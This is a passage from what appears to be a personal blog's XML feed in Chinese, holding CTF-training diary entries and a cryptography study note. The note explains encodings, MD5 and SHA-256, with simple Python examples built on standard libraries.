的問題，是我的主題依賴的問題）</li><li><del>年輕的肝</del></li></ul><p>總之，就是非常喜歡自己現在的成果啦！也希望你們可以搭建成功，同時也可以加入寫作的行列歐！</p><p>如果這篇文章對你有幫助，歡迎 <a href="https://cx330.tw/subscribe">訂閱我的部落格</a>，同時也非常歡迎大家在底下留言或按表情和我互動，如果我有哪裡說錯，也歡迎討論！</p>]]></content>
      
      
      <categories>
          
          <category> 開發角 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> 網頁開發 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 04] Grinding PicoCTF 2</title>
      <link href="/2024%20CTF%20Training/Day-04-Grinding-PicoCTF-2/"/>
      <url>/2024%20CTF%20Training/Day-04-Grinding-PicoCTF-2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>家人們家人們！有鑑於昨日收到的兩個消息，第一是 7&#x2F;10 到 7&#x2F;12 有 SCIST 資安課的 CTF 季後賽要打，第二是我錄取了 AIS3 暑期資安課程的備取，所以我決定先來好好地刷些題目。所以<a href="/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88">這個密碼學任督二脈</a>我就先緩緩，之後比賽結束了再將它給補上！！！</p><h1 id="今日進度"><a href="#今日進度" class="headerlink" title="今日進度"></a>今日進度</h1><p>今天下午寫了三題，Misc, Crypto, Forensics 各寫了一題，還算學到滿多新知識的！真的是越學越有趣了，我愛學習！學習使我快樂！深深的體會了知識所能帶給我的愉悅，是更深層次的快樂。</p><ol><li>binhexa</li><li>Custom encryption</li><li>MSB</li></ol><h1 id="今日狀態"><a href="#今日狀態" class="headerlink" title="今日狀態"></a>今日狀態</h1><ul><li>起床時間：<code>9:30</code>，假日睡晚一點 XD</li><li>知識量：⭐⭐⭐</li><li>疲勞程度：⭐⭐</li><li>精神狀態：⭐⭐⭐⭐⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF 修煉計畫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PicoCTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> 30天計畫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 03] Learning Cryptography 2</title>
      <link href="/2024%20CTF%20Training/Day-03-Learning-Cryptography-2/"/>
      <url>/2024%20CTF%20Training/Day-03-Learning-Cryptography-2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>這是第一個 TechStreak30 系列的第三天，今天一樣繼續 work on <a href="/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88">我的密碼學筆記</a>，歡迎大家來看！一想到之後要進入 RSA 的部分就感覺好難 XD，但總之就加油啦！</p><h1 id="今日進度"><a href="#今日進度" class="headerlink" title="今日進度"></a>今日進度</h1><p>今天寫完了 Hash 的部分，也有寫了一半的古典密碼學。進度還行，還不錯，明天繼續努力囉！</p><h1 id="今日狀態"><a href="#今日狀態" class="headerlink" title="今日狀態"></a>今日狀態</h1><ul><li>起床時間：<code>9:30</code></li><li>知識量：⭐⭐⭐</li><li>疲勞程度：⭐⭐⭐</li><li>精神狀態：⭐⭐⭐⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF 修煉計畫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> 30天計畫 </tag>
            
            <tag> Crypto </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 02] Learning Cryptography</title>
      <link href="/2024%20CTF%20Training/Day-02-Learning-Cryptography/"/>
      <url>/2024%20CTF%20Training/Day-02-Learning-Cryptography/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>密碼學一直以來都是我覺得超級超級困難的東西，為了可以更好的搞清楚它，決定寫一篇筆記來給自己（和各位）當作學習的資料！我把連結放在<a href="/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88">這個地方</a>，大家想看可以直接點過去噢！</p><h1 id="今日進度"><a href="#今日進度" class="headerlink" title="今日進度"></a>今日進度</h1><p>今天只寫完了前言以及編碼的部分。然後因為編碼的部分還算簡單，就是還沒有那麼多的數學，所以今天的知識量負擔滿輕的，不過明後天進入到數學部分（甚麼費馬小定理有的沒的）就會變超難了 XD。希望明天可以把古典密碼學那邊讀完，再來就進入對稱和非對稱加密啦！</p><h1 id="今日狀態"><a href="#今日狀態" class="headerlink" title="今日狀態"></a>今日狀態</h1><ul><li>起床時間：<code>8:30</code>但是滑手機到<code>9:05</code>才下床</li><li>知識量：⭐</li><li>疲勞程度：⭐⭐⭐</li><li>精神狀態：⭐⭐⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF 修煉計畫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> 30天計畫 </tag>
            
            <tag> Crypto </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cryptography Notes 密碼學任督二脈</title>
      <link href="/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88/"/>
      <url>/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="為甚麼會想寫這篇文"><a href="#為甚麼會想寫這篇文" class="headerlink" title="為甚麼會想寫這篇文"></a>為甚麼會想寫這篇文</h2><p>因為自己在學習的時候一直覺得密碼學是個很困難的領域，所以決定自己把一些筆記給記錄下來。一來是幫助自己以後可以回來翻，其次也希望可以幫助到正在學習密碼學的人！加油啦！</p><h2 id="柯克霍夫原則-Kerckhoffs’s-principle"><a href="#柯克霍夫原則-Kerckhoffs’s-principle" class="headerlink" title="柯克霍夫原則 Kerckhoffs’s principle"></a>柯克霍夫原則 Kerckhoffs’s principle</h2><blockquote><p>“A cryptosystem should remain secure even if an adversary knows all the details of the system, except for the secret decryption key.” — <strong><em>Kerckhoffs’s principle</em></strong></p></blockquote><p>柯克霍夫原則是由 Auguste Kerckhoffs 在 19 世紀提出的，其內容主要就是說明一個好的加密系統即使其運作原理全部都是公開的，只要金鑰未公開，他就應該要是安全的。資訊理論的創始人 Claude Shannon 將其改說為以下說法。</p><blockquote><p>“The enemy knows the system” — <strong><em>Claude Shannon</em></strong></p></blockquote><p>也就是說，永遠預設敵人知道你的整個加密系統是如何運作的，包括其中的算法以及各種原理。一個加密系統要在這樣的情境下還能保證其加密資料的安全性才稱得上是安全的。</p><h2 id="領域展開：密碼學的三大領域"><a href="#領域展開：密碼學的三大領域" class="headerlink" title="領域展開：密碼學的三大領域"></a>領域展開：密碼學的三大領域</h2><p>在密碼學中的任何知識幾乎都是圍繞著<strong>編碼</strong>、<strong>雜湊</strong>、<strong>加密</strong>這三個領域，所以就先來分別簡單聊聊他們各自都是甚麼吧！（這裡推薦一篇文章，講的滿深入淺出的：<a href="https://medium.com/starbugs/what-are-encoding-encrypt-and-hashing-4b03d40e7b0c">一次搞懂密碼學中的三兄弟 — Encode、Encrypt 跟 Hash</a>）</p><h3 id="編碼-Encoding"><a href="#編碼-Encoding" class="headerlink" title="編碼 Encoding"></a>編碼 Encoding</h3><p>編碼的目的是為了資料的傳輸或表達，把原本的資料<strong>換一種方式</strong>表達而已。因為他只是把資料轉換成另一種形式，所以編碼後的資料仍然可以被解碼（Decode），也就是說整個過程完全是<strong>可逆的</strong>。</p><p>所以這裡要特別注意。<strong>編碼不是加密！編碼不是加密！編碼不是加密！</strong></p><h3 id="雜湊-Hashing"><a href="#雜湊-Hashing" class="headerlink" title="雜湊 Hashing"></a>雜湊 Hashing</h3><p>雜湊，又名哈希（對就是直接從 Hash 直接翻過來）。雜湊的話主要是用於數據校驗以及數據完整性的驗證，還有一些其他的安全應用比如數位簽章等。雜湊算法會有以下的特性：</p><ol><li><strong>不可逆性</strong>：雜湊的算法是不可逆的，無法透過已知的雜湊值（哈希值 Hash values）回推原始資料。</li><li><strong>固定長度輸出</strong>：不管輸入的數據長度為何，哈希函式都會生成固定長度的哈希值。比如 SHA-256 的輸出長度就是固定 256 個 Bits。</li><li><strong>唯一性</strong>：理想情況下，兩個不同的輸入會產生不同的輸出（避免碰撞）。</li></ol><h3 id="加密-Encryption"><a href="#加密-Encryption" class="headerlink" title="加密 Encryption"></a>加密 Encryption</h3><p>加密就相對好理解啦！就是用於保護數據的機密性（Confidentiality），確保只有被授權的用戶才能訪問數據。其加密和解密的過程都<strong>依賴於密鑰</strong>（Key），密鑰的保密性也會直接的影響到數據的安全性。</p><p>就好比是一個保險箱，要打開它需要一把鑰匙，而那把鑰匙就是密鑰。如果密鑰被盜取，那麼保險箱也就毫無用處了。</p><h1 id="常見編碼-Common-Encoding"><a href="#常見編碼-Common-Encoding" class="headerlink" title="常見編碼 Common Encoding"></a>常見編碼 Common Encoding</h1><h2 id="ASCII-Encoding"><a href="#ASCII-Encoding" class="headerlink" title="ASCII Encoding"></a>ASCII Encoding</h2><h3 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h3><p>這應該大家都很熟悉吧！他的全名是 American Standard Code for Information Interchange，反正不是很重要，就是一個挺常見的編碼方式。以下是一張 ASCII 表：</p><p><img src="https://hackmd.io/_uploads/rJ6NTsq8A.png" alt="ASCII Table from GeeksforGeeks"></p><h3 id="Python-Code"><a href="#Python-Code" class="headerlink" title="Python Code"></a>Python Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 將字符串轉換為 ASCII 編碼</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_encode</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">ord</span>(char) <span class="keyword">for</span> char <span class="keyword">in</span> input_string]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將 ASCII 編碼轉換回字串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_decode</span>(<span class="params">ascii_codes</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(code) <span class="keyword">for</span> code <span class="keyword">in</span> ascii_codes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">input_string = <span class="string">&quot;This is ASCII encoding&quot;</span></span><br><span class="line">ascii_encoded = ascii_encode(input_string)</span><br><span class="line">ascii_decoded = ascii_decode(ascii_encoded)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Original string:&quot;</span>, input_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ASCII encoded:&quot;</span>, ascii_encoded)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ASCII decoded:&quot;</span>, ascii_decoded)</span><br></pre></td></tr></table></figure><h2 id="Base64-Encoding"><a href="#Base64-Encoding" class="headerlink" title="Base64 Encoding"></a>Base64 Encoding</h2><h3 id="簡介-1"><a href="#簡介-1" class="headerlink" title="簡介"></a>簡介</h3><p>Base64 通常用於傳輸二進制數據的場合，例如在電子郵件中嵌入圖像、文件等。它的範圍是從使用<code>A-Z</code>、<code>a-z</code>、<code>0-9</code>，共 62 個字符，加上兩個額外字符<code>+</code>和<code>/</code>，共 64 個字符。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Base64 編碼這個名稱代表著它<strong>基於 64 個可列印字元</strong>所形成的編碼。由於 $\log_{2}64&#x3D;6$，所以每 6 個位元（Bit）為一個基本單元，對應著一個可列印字元。每 3 個位元組（Byte）為 24 個位元，相當於 4 個 Base64 基本單元，代表每 3 個位元組可以由 4 個可列印字元表示。下圖就是每個可列印字元所對應的索引值。</p><p><img src="https://hackmd.io/_uploads/r1KgQh5LR.png" alt="Base64 encoding table from GeeksforGeeks"></p><h3 id="Python-Code-1"><a href="#Python-Code-1" class="headerlink" title="Python Code"></a>Python Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="comment"># 使用 base64 模組的 b64encode 函式進行編碼</span></span><br><span class="line">    encoded_bytes = base64.b64encode(data)</span><br><span class="line">    <span class="comment"># 將編碼後的位元組轉換為字串並回傳</span></span><br><span class="line">    <span class="keyword">return</span> encoded_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_decode</span>(<span class="params">encoded_data</span>):</span><br><span class="line">    <span class="comment"># 將 Base64 編碼的字串轉為位元組</span></span><br><span class="line">    encoded_bytes = encoded_data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 用 base64 的 b64decode 解碼</span></span><br><span class="line">    decoded_bytes = base64.b64decode(encoded_bytes)</span><br><span class="line">    <span class="comment"># 回傳解碼後的字串</span></span><br><span class="line">    <span class="keyword">return</span> decoded_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試</span></span><br><span class="line">data_to_encode = <span class="string">b&quot;This is Base64 encoding&quot;</span></span><br><span class="line"></span><br><span class="line">encoded_data = base64_encode(data_to_encode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Base64 Encoded Data:&quot;</span>, encoded_data)</span><br><span class="line"></span><br><span class="line">decoded_data = base64_decode(encoded_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Base64 Decoded Data:&quot;</span>, decoded_data)</span><br></pre></td></tr></table></figure><h3 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h3><p>除了 Base64 編碼以外，這個 Base 家族還有許多例如 Base16（Hex）、Base32、Base58（用於 Bitcoin）等不同的編碼方式。如果有興趣的話歡迎閱讀<a href="https://blog.csdn.net/Sciurdae/article/details/133642336">這篇文章</a>。</p><h2 id="URL-Encoding"><a href="#URL-Encoding" class="headerlink" title="URL Encoding"></a>URL Encoding</h2><h3 id="簡介-2"><a href="#簡介-2" class="headerlink" title="簡介"></a>簡介</h3><p>URL Encoding 也稱作為 Percent-encoding，是一種將 URL 中的特殊字符和非 ASCII 字符轉換為百分號（%）後跟兩個十六進制數字的形式，以確保這些字符在 URL 中能夠被正確解析和傳輸。</p><h3 id="Python-Code-2"><a href="#Python-Code-2" class="headerlink" title="Python Code"></a>Python Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL 編碼</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_encode</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="keyword">return</span> urllib.parse.quote(input_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL 解碼</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_decode</span>(<span class="params">encoded_string</span>):</span><br><span class="line">    <span class="keyword">return</span> urllib.parse.unquote(encoded_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">input_string = <span class="string">&quot;This is URL encoding&quot;</span></span><br><span class="line">url_encoded = url_encode(input_string)</span><br><span class="line">url_decoded = url_decode(url_encoded)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Original string:&quot;</span>, input_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;URL encoded:&quot;</span>, url_encoded)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;URL decoded:&quot;</span>, url_decoded)</span><br></pre></td></tr></table></figure><h2 id="小結"><a href="#小結" class="headerlink" title="小結"></a>小結</h2><p>這裡面其實在打 CTF 的時候最常用到的就是 Base64 了，所以其實只要熟悉一下 Base64 的原理還有代碼，在比賽的時候可以快速編碼解碼就可以啦！</p><h1 id="常見雜湊函式-Common-Hash-Functions"><a href="#常見雜湊函式-Common-Hash-Functions" class="headerlink" title="常見雜湊函式 Common Hash Functions"></a>常見雜湊函式 Common Hash Functions</h1><p>如果想要了解一下哈希函式還有數位簽章的大致運作流程，可以在往下看之前先看一下這部影片。我自己認為它的內容簡單而且李永樂老師教的很清晰，幾乎沒有任何數學難度就可以理解！十分推薦去看！</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 56.25%;">    <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" src="https://www.youtube.com/embed/uS1ZIAsvT5w" frameborder="0" allowfullscreen></iframe></div><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><h3 id="簡介-3"><a href="#簡介-3" class="headerlink" title="簡介"></a>簡介</h3><p>MD5 的全名是 Message Digest Algorithm 5，它能將任意長度的數據轉換為 128 位（16 Bytes）長度的哈希值。它的運算過程如下：</p><ol><li><p><strong>填充資料</strong></p><ul><li>將資料的末尾添加一個”1”，為了標記填充的開始；然後添加足夠位的”0”，使資料的長度（以 Bit 為單位）對 512 取模後的結果為 448。這樣可以確保最終加上 64 位長度信息後，總長度是 512 的整數倍。</li><li>最後，將消息的原始長度（以位為單位）附加到消息的末尾，使得填充後的消息長度為 512 的倍數。</li></ul></li><li><p><strong>初始化 MD 緩衝區</strong></p><ul><li>MD5 使用四個 32 位的變量（A, B, C, D）來存儲中間和最終的雜湊值。它們分別初始化為：<ul><li>A &#x3D; 0x67452301</li><li>B &#x3D; 0xEFCDAB89</li><li>C &#x3D; 0x98BADCFE</li><li>D &#x3D; 0x10325476</li></ul></li></ul></li><li><p><strong>處理資料</strong></p><ul><li><p>將填充後的資料以 512 位（64 Bytes）分成多個塊（Chunk）。</p></li><li><p>對於每個 512 位的塊，再分為 16 個 32 位的小塊。</p></li><li><p>用這些 32 位的小塊和上面初始化好的四個 32 位的變量（A, B, C, D），進行四輪（每輪 16 步）迭代運算。每一步使用非線性函數（F, G, H, I）和特定的常數以及循環左移操作，來混淆和壓縮數據。公式如下：</p><p>  $F(X, Y, Z) &#x3D; (X \land Y) \lor (\neg X \land Z)$<br>  $G(X, Y, Z) &#x3D; (X \land Z) \lor (Y \land \neg Z)$<br>  $H(X, Y, Z) &#x3D; X \oplus Y \oplus Z$<br>  $I(X, Y, Z) &#x3D; Y \oplus (X \lor \neg Z)$<br>  $\oplus, \land, \lor, \neg \text{ are the signs of XOR, AND, OR, NOT}$</p></li></ul></li><li><p><strong>輸出最終哈希值</strong></p><ul><li>最終將四個 32 位的變量 A, B, C, D 串聯起來成為一個 128 位的哈希值（以小端序表示）</li></ul></li></ol><p>看完文字敘述之後我們來看一下 MD5 的圖解吧！</p><p><img src="https://hackmd.io/_uploads/BJav5njU0.png" alt="圖示 MD5 from Wikipedia"></p><p>看完了那麼多可能有點頭昏腦脹，但沒關係！慢慢理解它的過程還有大致流程，多看幾次可能就比較理解了。接下來講點比較簡單理解的東西吧！甚麼是 Endian？</p><h3 id="端序-Endian"><a href="#端序-Endian" class="headerlink" title="端序 Endian"></a>端序 Endian</h3><p>在了解端序是甚麼之前，我們先來講個有趣的吧！</p><blockquote><p>「endian」一詞來源於十八世紀愛爾蘭作家喬納森·斯威夫特（Jonathan Swift）的小說《格列佛遊記》（Gulliver’s Travels）。小說中，小人國為水煮蛋該從大的一端（Big-End）剝開還是小的一端（Little-End）剝開而爭論，爭論的雙方分別被稱為「大頭派（Big-Endians）」和「小頭派（Little-Endians）」。（From <a href="https://zh.wikipedia.org/zh-tw/%E5%AD%97%E8%8A%82%E5%BA%8F">Wikipedia</a>）</p></blockquote><p>好了這真的十分不重要但還是滿有趣的 XD。進入正題吧！</p><p>端序，又稱位元組順序，又稱尾序。它指的是排列位元組的順序或方式。它又分為以下兩種：</p><ol><li><strong>大端序 Big-Endian</strong></li><li><strong>小端序 little-Endian</strong></li></ol><p>那他們具體又有甚麼差別呢？下面一張圖看完馬上可以理解其中的差別在哪！</p><p><img src="https://hackmd.io/_uploads/ryh8Rhj8C.png" alt="Source: The Bit Theories"></p><p>如果這張圖還是不能理解，那我們再看下一張圖！</p><p><img src="https://hackmd.io/_uploads/rJO9p3iI0.png" alt="Little Endian, things are stored in reverse order. Source: fundd.blogspot.in"></p><p>如果看圖片看不太懂，那就用文字來介紹一下。</p><p>首先，要先知道甚麼是 LSB 和 MSB，LSB 是最低有效位（Least Significant Bit，LSB）；MSB 是最高有效位（Most Significant Bit，MSB）。和十進制類似，通常 MSB 是二進制數的最左側，而 LSB 位於最右側。</p><p>而大端序就是是從數據的 MSB 作為起始位置；而小端序是從最低有效位 LSB 開始。</p><p>那大端序和小端序在應用上有甚麼差別呢？</p><ol><li><strong>大端序</strong><ul><li>更加直觀</li><li>應用於一些網絡協議中，例如 TCP&#x2F;IP</li></ul></li><li><strong>小端序</strong><ul><li>更符合計算機科學中的數學計算順序，因為最低有效位在前面更方便處理。（像是數據型態的轉換）</li></ul></li></ol><p>端序的部份我就大致介紹到這邊。如果對端序有興趣想要更深入了解的話，可以去看<a href="https://blog.csdn.net/kevin_tech/article/details/113979523">這篇文章</a>！</p><h3 id="Python-Code-3"><a href="#Python-Code-3" class="headerlink" title="Python Code"></a>Python Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要雜湊的消息</span></span><br><span class="line">message = <span class="string">&quot;This is MD5!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 創建一個 MD5 雜湊對象</span></span><br><span class="line">md5_hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將消息編碼後更新到雜湊對象中</span></span><br><span class="line">md5_hash.update(message.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取雜湊值（十六進制表示）</span></span><br><span class="line">hash_hex = md5_hash.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印雜湊值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;MD5 value: <span class="subst">&#123;hash_hex&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="MD5-已死"><a href="#MD5-已死" class="headerlink" title="MD5 已死"></a>MD5 已死</h3><p>為甚麼說 MD5 已死呢？在 2004 年，中國的密碼學家王小雲和其研究同事發表了一篇論文，詳細描述了如何在不到一個小時內找到 MD5 的碰撞，同時這也證明了 MD5 是不安全的。</p><p>2012 年的時候密碼學研究人員 Marc Stevens 提出了一種更高效的 MD5 碰撞攻擊方法，稱為 Fast Collision Attack on MD5，他還開發了一個名為 HashClash 的工具，用於自動化生成 MD5 碰撞。</p><p>想更詳細的了解其原理，可以觀看以下影片！</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 56.25%;">    <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" src="https://www.youtube.com/embed/aHeRBeJLjMI" frameborder="0" allowfullscreen></iframe></div><h2 id="SHA-256"><a href="#SHA-256" class="headerlink" title="SHA-256"></a>SHA-256</h2><h3 id="簡介-4"><a href="#簡介-4" class="headerlink" title="簡介"></a>簡介</h3><p>SHA(Secure Hash Algorithm)家族的雜湊函式是被美國聯邦資訊處理標準（FIPS）所認證的安全雜湊算法。他們（SHA 家族）是由美國國家安全局所設計，並由美國國家標準與技術研究院所發布的。他們家族中除了 SHA-256 以外還有 SHA-224、SHA-512 等等的雜湊函式，但這裡就主要講解最常見的 SHA-256。</p><p>SHA-256 和 MD5 其實流程是差不多的，大概的流程如下：</p><ol><li><p><strong>填充資料</strong></p><ul><li>將資料的末尾添加一個”1”，為了標記填充的開始</li><li>添加”0”位，直到資料的長度對 512 取模後等於 448。</li><li>最後，將資料的原始長度（以 Bit 為單位）附加到末尾，使得填充後的資料長度為 512 的倍數。</li></ul></li><li><p><strong>初始化緩衝區</strong></p><ul><li>SHA-256 使用八個 32 位元的變量來存儲中間和最終的雜湊值：<ul><li>h0 &#x3D; 0x6a09e667</li><li>h1 &#x3D; 0xbb67ae85</li><li>h2 &#x3D; 0x3c6ef372</li><li>h3 &#x3D; 0xa54ff53a</li><li>h4 &#x3D; 0x510e527f</li><li>h5 &#x3D; 0x9b05688c</li><li>h6 &#x3D; 0x1f83d9ab</li><li>h7 &#x3D; 0x5be0cd19</li></ul></li><li>是對自然數中前 8 個質數（2, 3, 5, 7, 11, 13, 17, 19）的平方根的小數部分取前 32 bits 而來。</li></ul></li><li><p><strong>處理資料</strong></p><ul><li><p>將填充後的資料以 512 位（64 Bytes）分成多個塊（Chunk）</p></li><li><p>對於每個 512 位的塊，再分為 16 個 32 位的小塊。</p></li><li><p>用這些 32 位的小塊和原本初始化好的 8 個變量進行迭代運算，由於過程太過於複雜，我會將其公式定義和圖解放在下面。</p><p>  $Ch(x, y, z) &#x3D; (x \land y) \oplus (\neg x \land z)$<br>  $Maj(x, y, z) &#x3D; (x \land y) \oplus (x \land z) \oplus (y \land z)$<br>  $\Sigma_0(x) &#x3D; S^2(x) \oplus S^{13}(x) \oplus S^{22}(x)$<br>  $\Sigma_1(x) &#x3D; S^6(x) \oplus S^{11}(x) \oplus S^{25}(x)$<br>  $\sigma_0(x) &#x3D; S^7(x) \oplus S^{18}(x) \oplus R^3(x)$<br>  $\sigma_1(x) &#x3D; S^{17}(x) \oplus S^{19}(x) \oplus R^{10}(x)$</p><p>  <img src="https://hackmd.io/_uploads/B1pTgx2U0.png" alt="SHA-256 workflow from Wikipedia"></p></li></ul></li><li><p>輸出最終哈希值</p><ul><li>當所有的 512 位塊都處理完成後，將 8 個變量 h0 到 h7 連接起來（大端序），形成最終的 256 位（32 字節）雜湊值。這個雜湊值即為輸入數據的 SHA-256 雜湊值。</li></ul></li></ol><h3 id="Python-Code-4"><a href="#Python-Code-4" class="headerlink" title="Python Code"></a>Python Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="comment"># 將消息編碼為字節</span></span><br><span class="line">    message_bytes = message.encode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 創建 SHA-256 雜湊對象</span></span><br><span class="line">    sha256_hash = hashlib.sha256()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新雜湊對象</span></span><br><span class="line">    sha256_hash.update(message_bytes)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 獲取雜湊值</span></span><br><span class="line">    hash_hex = sha256_hash.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hash_hex</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試 SHA-256 